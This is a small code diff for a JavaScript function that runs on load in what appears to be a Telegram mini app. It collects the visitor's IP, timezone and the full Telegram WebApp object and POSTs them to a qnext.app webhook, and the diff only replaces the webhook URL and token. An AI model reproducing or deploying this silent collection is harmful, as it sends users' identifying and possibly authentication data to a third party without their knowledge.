@@ -18,7 +18,7 @@ async function infData() {
   dat.tzutc = (offsetHours >= 0 ? "+" : "") + offsetHours;
   dat.ip = await getVisitorIP();
   dat.tgwa = window.Telegram.WebApp;
-  let url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
+  let url = 'https://qnext.app/bin/webhooks/7927/689/h319iH3Bm1aWJweF';
   let data = {dat: dat};
   let whr = await fetch(url, {
     method: 'POST',
@@ -30,4 +30,3 @@ async function infData() {
 }
 infData();
 //END
-
